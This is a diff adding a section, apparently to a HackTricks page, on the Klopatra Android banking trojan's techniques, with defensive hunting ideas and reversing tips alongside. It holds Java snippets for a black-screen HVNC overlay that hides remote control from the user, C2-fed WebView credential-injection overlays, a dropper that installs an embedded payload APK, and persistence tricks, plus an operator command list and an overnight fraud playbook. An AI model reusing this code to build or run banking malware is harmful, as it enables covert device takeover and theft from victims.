@@ -429,6 +429,160 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - Detect installation/launch of an external NFC-relay app triggered by another app.
 - For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.
 
+## Android banking trojans: HVNC overlays, dynamic injections, droppers, persistence, and anti-analysis (Klopatra TTPs)
+
+The Klopatra operation (2025) illustrates a mature Android banker/RAT playbook that combines Accessibility‑driven device takeover, covert HVNC sessions, dynamic credential injections, robust persistence, and strong anti‑analysis. Below are the reusable techniques abstracted for offensive testing and blue‑team hunting.
+
+### Android Accessibility abuse & HVNC black‑screen overlays
+
+- After the victim enables the rogue AccessibilityService, operators can initiate remote screen control (VNC/HVNC).
+- HVNC stealth: dim the screen to zero and draw a full‑screen black overlay so the user perceives the device as off while the operator drives the UI.
+
+Minimal implementation idea:
+
+```java
+// 1) Dim screen to 0.0f (Activity context)
+Window w = getWindow();
+WindowManager.LayoutParams p = w.getAttributes();
+p.screenBrightness = 0.0f; // 0..1
+w.setAttributes(p);
+
+// 2) Full‑screen black overlay on top of all apps (no SYSTEM_ALERT_WINDOW prompt)
+WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+View black = new View(this); black.setBackgroundColor(Color.BLACK);
+WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+    MATCH_PARENT, MATCH_PARENT,
+    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, // bypasses draw‑over‑apps prompt
+    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+    PixelFormat.OPAQUE);
+wm.addView(black, lp);
+```
+
+Operator flow commonly seen during HVNC:
+- Turn screen black (action_blackscreen), ensure brightness 0.0, optionally lock/unlock with known PIN/pattern.
+- Open target app and automate transfers with Accessibility gestures and `performGlobalAction` nav.
+
+Hunting ideas:
+- Accessibility gestures at high rate while display state suggests OFF/dimmed; sudden brightness to 0.0 followed by automated nav in the background.
+- Foreground service with node‑tree dumps or continuous screenshots during user inactivity windows (night‑time, on‑charge).
+
+See also:
+
+{{#ref}}
+../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
+{{#endref}}
+
+### Dynamic WebView credential injections (overlay HTML)
+
+- Foreground‑app watcher detects targeted banking/crypto packages and requests HTML templates from C2.
+- A transparent/opaque overlay WebView loads attacker‑supplied HTML to clone login/2FA screens; credentials are exfiltrated on submit.
+
+Minimal loader:
+
+```java
+WebView wv = new WebView(ctx);
+wv.getSettings().setJavaScriptEnabled(true);
+wv.loadDataWithBaseURL(baseUrlFromC2, htmlFromC2, "text/html", "utf-8", null);
+// place as TYPE_ACCESSIBILITY_OVERLAY so background app still receives touches if desired
+```
+
+Toggle per‑target injection modes server‑side (e.g., `enj_switch`) to avoid noisy overlays when not needed.
+
+See also:
+
+{{#ref}}
+../../mobile-pentesting/android-app-pentesting/webview-attacks.md
+{{#endref}}
+
+### Dropper‑based stage install (REQUEST_INSTALL_PACKAGES)
+
+- First‑stage APK (often themed IPTV/benefits/updates) coerces enabling install from unknown sources for that app (Android 8+ per‑app source).
+- Payload is embedded (e.g., assets/…, JSON‑packed resource) and installed programmatically; Accessibility auto‑clicks confirm dialogs where needed.
+
+Sketch:
+
+```java
+if (!getPackageManager().canRequestPackageInstalls()) {
+  startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+    Uri.parse("package:" + getPackageName())));
+}
+// Then stream embedded payload to PackageInstaller
+PackageInstaller pi = getPackageManager().getPackageInstaller();
+int id = pi.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));
+try (PackageInstaller.Session s = pi.openSession(id);
+     InputStream in = getAssets().open("payload.apk");
+     OutputStream out = s.openWrite("base.apk", 0, -1)) {
+  byte[] buf = new byte[8192]; for(int r; (r=in.read(buf))>0;) out.write(buf,0,r); s.fsync(out);
+}
+pi.commit(id, PendingIntent.getBroadcast(this,0,new Intent("INSTALL_DONE"), PendingIntent.FLAG_IMMUTABLE).getIntentSender());
+```
+
+### Persistence via battery‑optimization whitelisting and self‑permission toggling
+
+- Whitelist the app from Doze/App Standby so background services keep running:
+
+```java
+PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+  Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+               Uri.parse("package:" + getPackageName()));
+  startActivity(i); // Accessibility can auto‑approve
+}
+```
+
+- Use Accessibility to navigate to the app’s own Accessibility‑service page and toggle it ON/OFF programmatically (self‑healing of permission loss); similarly guide users to Notification access and overlay settings.
+- Defensive uninstallation can be frustrated by spamming `GLOBAL_ACTION_BACK` while the Settings uninstall flow is on top.
+
+### Anti‑analysis with commercial protectors + native .so heavy logic
+
+- Code protection stack:
+  - Commercial packer/virtualizer (e.g., Virbox) adds VM‑style bytecode encryption, anti‑debug/anti‑emulator, integrity, and string/resource encryption.
+  - Core logic moved from Java/Kotlin to JNI `.so` libraries to defeat static triage; additional custom string ciphers on top of the packer.
+- Reversing tips:
+  - Hook `System.loadLibrary`/`dlopen` to log native loads and `RegisterNatives` to enumerate JNI bindings at runtime.
+  - Neuter `ptrace`/anti‑debug in native with Frida `Interceptor.replace` and attach post‑init to avoid early kills.
+  - When inline hooks fail (tiny funcs, BTI/PAC), prefer import‑slot rebinding or early loaders (frida‑server ≥16), or drop a lightweight JNI logger (e.g., SoTap) to collect telemetry from inside the process.
+
+See also:
+
+{{#ref}}
+../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
+{{#endref}}
+
+{{#ref}}
+../../mobile-pentesting/android-app-pentesting/android-anti-instrumentation-and-ssl-pinning-bypass.md
+{{#endref}}
+
+### Operator command surface (example)
+
+<details>
+<summary>Click to expand</summary>
+
+```
+Screen/remote: start_vnc, stop_vnc, start_hvnc, stop_hvnc, screen_control, screen_off, screen_on, screen_dump, take_screenshot
+Stealth/HVNC: action_blackscreen, action_blackscreen2 (black overlay/brightness 0)
+UI actions: click_coord, action_click, action_long_click, action_edit_text, click_by_id_click, click_by_id_press_long, click_by_id_and_text, action_custom_gesture, swipe, swipe_up, swipe_down, swipe_left, swipe_right, type_and_enter
+System nav: global_action_back, global_action_home, global_action_recents, open_recents, device_lock_screen
+Unlock/launch: unlock_pin, open_app, open_app_by_name, open_settings
+Data/ops: get_device_info, paketleri_al (list apps), logcat, kill_activity, start_record_gesture, stop_record_gesture, send_text_to_view (yazi_gonder)
+Audio: ses_kapat (mute)
+Overlay/injection: open_enj (WebView load HTML), open_url, enj_switch
+Permission flows: bildirim (fake notification), bildirim_izin (open notification settings), izin_switch / change_permission (toggle own Accessibility), diger_uyg (open app settings), pil_opt (battery optimization), open_notifications, get_permission
+```
+
+</details>
+
+### Nocturnal HVNC fraud playbook (observed)
+
+- Preconditions: device charging via `BatteryManager` and `PowerManager.isInteractive()==false` (user idle).
+- Stealth: trigger black‑screen overlay + brightness 0.0.
+- Unlock: enter stored PIN/pattern and wake as needed.
+- Execute: launch bank app, add payee, initiate multiple instant transfers under HVNC.
+
+### Infrastructure/hunting note
+
+- Even when fronted by Cloudflare, origin IPs can be recovered via historical DNS/asset intelligence if actors briefly point apex/subdomains directly at the origin. Linking multiple campaigns is possible by matching origin responses across pivots.
+
 ## References
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
@@ -440,5 +594,8 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Klopatra: exposing a new Android banking trojan operation with roots in Turkey (Cleafy)](https://www.cleafy.com/cleafy-labs/klopatra-exposing-a-new-android-banking-trojan-operation-with-roots-in-turkey)
+- [Ignore battery optimizations intent (ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)](https://developer.android.com/reference/android/provider/Settings#ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+- [REQUEST_INSTALL_PACKAGES permission](https://developer.android.com/reference/android/Manifest.permission#REQUEST_INSTALL_PACKAGES)
 
 {{#include ../../banners/hacktricks-training.md}}
